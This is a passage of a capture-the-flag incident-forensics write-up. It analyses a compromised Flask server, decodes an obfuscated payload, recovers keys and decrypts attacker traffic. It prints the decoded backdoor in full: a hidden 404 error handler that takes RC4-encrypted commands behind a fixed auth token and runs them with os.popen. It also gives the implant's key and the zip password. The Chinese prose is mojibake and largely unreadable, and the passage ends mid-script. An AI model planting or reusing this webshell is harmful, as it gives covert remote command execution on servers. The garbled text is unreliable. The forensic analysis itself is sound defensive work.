class="string">b&#x27;=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&#x27;</span>))</span><br></pre></td></tr></table></figure><p>æ˜¯pythonåŒ¿åå‡½æ•°è¯­å¥ï¼Œé€†å‘ä»£ç é€»è¾‘ï¼Œå°†base64é€†åºï¼Œç„¶åè§£å‹zlibå³å¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210847050.png" alt="image-20251229210847050"></p><p>å‘ç°å¤„ç†å®Œä¹‹åè¿˜æœ‰ä¸€å±‚ï¼Œç›´æ¥ä½¿ç”¨cyberchef,å°†è¾“å‡ºä½œä¸ºè¾“å…¥é‡å¤è§£ç ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210926646.png" alt="image-20251229210926646"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> exc_class</span><br><span class="line"><span class="keyword">global</span> code</span><br><span class="line"><span class="keyword">import</span> os,binascii</span><br><span class="line">exc_class, code = app._get_exc_class_and_code(<span class="number">404</span>)</span><br><span class="line">RC4_SECRET = <span class="string">b&#x27;v1p3r_5tr1k3_k3y&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">                S[i], S[j] = S[j], S[i]</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">                i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">                j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">                S[i], S[j] = S[j], S[i]</span><br><span class="line">                res.append(char ^ S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor_handler</span>():</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;X-Token-Auth&#x27;</span>) != <span class="string">&#x27;3011aa21232beb7504432bfa90d32779&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line">        enc_hex_cmd = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> enc_hex_cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                enc_cmd = binascii.unhexlify(enc_hex_cmd)</span><br><span class="line">                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                output_bytes = <span class="built_in">getattr</span>(os, <span class="string">&#x27;popen&#x27;</span>)(cmd).read().encode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                enc_output = rc4_crypt(output_bytes, RC4_SECRET)</span><br><span class="line">                <span class="keyword">return</span> binascii.hexlify(enc_output).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line">app.error_handler_spec[<span class="literal">None</span>][code][exc_class]=<span class="keyword">lambda</span> error: backdoor_handler()</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯†ç ä¸ºï¼š v1p3r_5tr1k3_k3y</p><h4 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h4><p><strong>æ”»å‡»è€…ä¸Šä¼ äº†ä¸€ä¸ªäºŒè¿›åˆ¶åé—¨ï¼Œè¯·å†™å‡ºæœ¨é©¬è¿›ç¨‹æ‰§è¡Œçš„æœ¬ä½“æ–‡ä»¶çš„åç§°ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxx}ï¼Œä»…å†™æ–‡ä»¶åä¸åŠ è·¯å¾„</strong></p><p>é€šè¿‡åˆ†æQ3å¾—åˆ°çš„ä»£ç ï¼Œå¯ä»¥å¾—çŸ¥åç»­çš„æ•°æ®(data)ä½¿ç”¨äº†RC4åŠ å¯†ï¼Œä¸”æˆ‘ä»¬å·²ç»å¾—åˆ°å¯†é’¥ï¼Œç›´æ¥è§£å¯†å³å¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211043392.png" alt="image-20251229211043392"></p><p>æ‰§è¡Œidå‘½ä»¤åŠå›æ˜¾ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211102313.png" alt="image-20251229211102313"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211115401.png" alt="image-20251229211115401"></p><p>lså‘½ä»¤åŠå›æ˜¾ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211134318.png" alt="image-20251229211134318"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211147535.png" alt="image-20251229211147535"></p><p>ä¸‹è½½äº†shell.zip</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211205355.png" alt="image-20251229211205355"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æå–å‡ºshell.zipçš„å†…å®¹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211223031.png" alt="image-20251229211223031"></p><p>åç»­æ‰§è¡Œäº†è§£å‹æ“ä½œï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211240595.png" alt="image-20251229211240595"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211250780.png" alt="image-20251229211250780"></p><p>ä»è¿™é‡Œå¯ä»¥å¾—åˆ°zipçš„å¯†ç ä¸ºï¼šnf2jd092jd01</p><p>æˆ‘ä»¬è¿›è¡Œè§£å‹å³å¯å¾—åˆ°shellæ–‡ä»¶</p><p>ä¹‹åå°†shellç§»åŠ¨åˆ°äº†python3.13:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211312936.png" alt="image-20251229211312936"></p><p>é‚£ä¹ˆå¯ä»¥å¾—åˆ°æ‰§è¡Œçš„äºŒè¿›åˆ¶åé—¨çš„åå­—å³ä¸ºpython3.13</p><h4 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h4><p><strong>è¯·æå–é©»ç•™çš„æœ¨é©¬æœ¬ä½“æ–‡ä»¶ï¼Œé€šè¿‡é€†å‘åˆ†ææ‰¾å‡ºæœ¨é©¬æ ·æœ¬é€šä¿¡ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ï¼ˆhexï¼Œå°å†™å­—æ¯ï¼‰ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{[0-9a-f]+}</strong></p><p>åˆ†æä¸Šé¢è§£å‹å¾—åˆ°çš„shellç¨‹åºï¼Œè¿›è¡Œé€†å‘åˆ†æï¼š</p><p>shellçš„ä¸»å‡½æ•°ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211543156.png" alt="image-20251229211543156"></p><p>å‘ç°keyæ˜¯é€šè¿‡randå¾—åˆ°çš„ï¼Œè€Œseedé€šè¿‡tcpåœ¨æµé‡ä¸­ä¼ è¾“</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211559002.png" alt="image-20251229211559002"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211611436.png" alt="image-20251229211611436"></p><p>å†™å‡ºè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t v8[<span class="number">4</span>];</span><br><span class="line">  srand(<span class="number">0x34952046</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    v8[i] = rand();</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;%x&quot;</span>,v8[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸‹è¿è¡Œï¼ŒæŠŠå¾—åˆ°çš„ç»“æœæ¢åºå³ä¸ºåŠ å¯†å¯†é’¥</p><p>ac46fb610b313b4f32fc642d8834b456</p><h4 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h4><p><strong>è¯·æäº¤æ”»å‡»è€…è·å–æœåŠ¡å™¨ä¸­çš„flagã€‚ç»“æœæäº¤å½¢å¼ï¼šflag{xxxx}</strong></p><p>ä¸Šä¼ shellåï¼Œæ”»å‡»è€…è¿›è¡Œè¿æ¥ï¼Œä¹‹åçš„é€šä¿¡ä¸ºåŠ å¯†æµé‡ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211720380.png" alt="image-20251229211720380"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211736493.png" alt="image-20251229211736493"></p><p>ä»ä¸­æå–å‡ºåŠ å¯†çš„å‘½ä»¤ï¼ˆdataå€¼ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">49b351855f211b85bd012f80ce8ed5b3</span><br><span class="line">2cc5becb37ca595a89445461c6512efc</span><br><span class="line">b863696da0c6bb28da46e09069dd644f</span><br><span class="line">87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7</span><br><span class="line">b7c88bb0d92308a57f83d08a90ae024c</span><br><span class="line">4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770</span><br><span class="line">7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729</span><br></pre></td></tr></table></figure><p>é€†å‘åŠ å¯†ç®—æ³•è¿›è¡Œè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_params</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    sbox = data[<span class="number">0x2020</span>:<span class="number">0x2020</span>+<span class="number">256</span>]</span><br><span class="line">    fk = [struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, data, <span class="number">0x2120</span>+i*<span class="number">4</span>)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    ck = [struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, data, <span class="number">0x2140</span>+i*<span class="number">4</span>)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> sbox, fk, ck</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sbox, fk, ck</span>):</span><br><span class="line">        <span class="variable language_">self</span>.sbox = sbox</span><br><span class="line">        <span class="variable language_">self</span>.fk = fk</span><br><span class="line">        <span class="variable language_">self</span>.ck = ck</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tau</span>(<span class="params">self, x</span>):</span><br><span class="line">        b0 = x &amp; <span class="number">0xFF</span></span><br><span class="line">        b1 = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        b2 = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        b3 = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">return</span> ((<span class="variable language_">self</span>.sbox[b0] &lt;&lt; <span class="number">24</span>) | </span><br><span class="line">                (<span class="variable language_">self</span>.sbox[b1] &lt;&lt; <span class="number">16</span>) | </span><br><span class="line">                (<span class="variable language_">self</span>.sbox[b2] &lt;&lt; <span class="number">8</span>) | </span><br><span class="line">                <span class="variable language_">self</span>.sbox[b3])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> x ^ rol(x, <span class="number">2</span>) ^ rol(x, <span class="number">10</span>) ^ rol(x, <span class="number">18</span>) ^ rol(x, <span class="number">24</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Lp</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> x ^ rol(x, <span class="number">13</span>) ^ rol(x, <span class="number">23</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.L(<span class="variable language_">self</span>.tau(x))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Tp</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.Lp(<span class="variable language_">self</span>.tau(x))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">self, key, encrypt</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Key must be 16 bytes&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        K = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            word = ((key[i*<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">                    (key[i*<span class="number">4</span>+<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">                    (key[i*<span class="number">4</span>+<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                    key[i*<span class="number">4</span>+<span class="number">3</span>])</span><br><span class="line">            K.append(word ^ <span class="variable language_">self</span>.fk[i])</span><br><span class="line">        </span><br><span class="line">        rk = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            tmp = K[<span class="number">1</span>] ^ K[<span class="number">2</span>] ^ K[<span class="number">3</span>] ^ <span class="variable language_">self</span>.ck[i]</span><br><span class="line">            newk = K[<span class="number">0</span>] ^ <span class="variable language_">self</span>.Tp(tmp)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> encrypt:</span><br><span class="line">                rk[i] = newk</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rk[<span class="number">31</span>-i] = newk</span><br><span class="line">            </span><br><span class="line">            K = [K[<span class="number">1</span>], K[<span class="number">2</span>], K[<span class="number">3</span>], newk]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> rk</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">self, rk, block</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(block) != <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Block must be 16 bytes&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        X = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            word = ((block[i*<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">                    (block[i*<span class="number">4</span>+<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">                    (block[i*<span class="number">4</span>+<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                    block[i*<span class="number">4</span>+<span class="number">3</span>])</span><br><span class="line">            X.append(word)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            tmp = rk[i] ^ X[<span class="number">1</span>] ^ X[<span class="number">2</span>] ^ X[<span class="number">3</span>]</span><br><span class="line">            newx = X[<span class="number">0</span>] ^ <span class="variable language_">self</span>.T(tmp)</span><br><span class="line">            X = [X[<span class="number">1</span>], X[<span class="number">2</span>], X[<span class="number">3</span>], newx]</span><br><span class="line">        </span><br><span class="line">        out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>]:</span><br><span class="line">            out += <span class="built_in">bytes</span>([(X[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">                         (X[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">                         (X[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">                         X[i] &amp; <span class="number">0xFF</span>])</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, key, cipher</span>):</span><br><span class="line">        rk = <span class="variable language_">self</span>.expand(key, <span class="literal">False</span>)</span><br><span class="line">        result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">16</span>):</span><br><span class="line">            block = cipher[i:i+<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(block) == <span class="number">16</span>:</span><br><span class="line">                result += <span class="variable language_">self</span>.process(rk, block)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            pad = result[-<span 